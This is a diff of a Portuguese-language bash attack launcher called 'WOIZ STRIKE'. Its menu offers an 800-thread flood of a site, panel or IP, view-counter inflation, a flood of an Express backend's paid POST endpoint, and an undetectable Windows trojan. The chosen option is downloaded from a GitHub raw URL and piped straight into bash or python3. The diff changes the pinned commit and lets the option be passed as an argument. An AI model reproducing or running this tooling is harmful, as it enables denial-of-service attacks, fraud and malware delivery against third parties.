@@ -1,16 +1,14 @@
 #!/usr/bin/env bash
-# WOIZ STRIKE MENU - 1 comando, escolhe numero e ja ataca
-RAW="https://raw.githubusercontent.com/Hhhaofuqoc/woiz-strike/ab0338e523fd6f5081ff356907d134dc2cda3e84"
-echo "=============================="
-echo "      W O I Z  S T R I K E"
-echo "=============================="
-echo " [1] FLOOD SITE+PAINEL+IP (800 threads)"
-echo " [2] CONTADOR INFLACAO (visualizacoes)"
-echo " [3] FLOOD BACKEND EXPRESS (POST pago)"
-echo " [4] TROJAN FUD (windows)"
-echo " [0] SAIR"
-echo -n "digite o numero: "
-read OP 2>/dev/tty || read OP
+RAW="https://raw.githubusercontent.com/Hhhaofuqoc/woiz-strike/ccc18ca76b1b7922a1301654d65b908af7dc77d7"
+OP="$1"
+if [ -z "$OP" ]; then
+  echo " [1] FLOOD SITE+PAINEL+IP"
+  echo " [2] CONTADOR INFLACAO"
+  echo " [3] FLOOD BACKEND EXPRESS"
+  echo " [4] TROJAN FUD"
+  echo -n "digite o numero: "
+  read OP </dev/tty || read OP
+fi
 if [ "$OP" = "1" ]; then curl -skL $RAW/woiz_strike.sh | bash
 elif [ "$OP" = "2" ]; then curl -skL $RAW/views_inflate.py | python3 - 20
 elif [ "$OP" = "3" ]; then curl -skL $RAW/backend_trace.py | python3 - 15
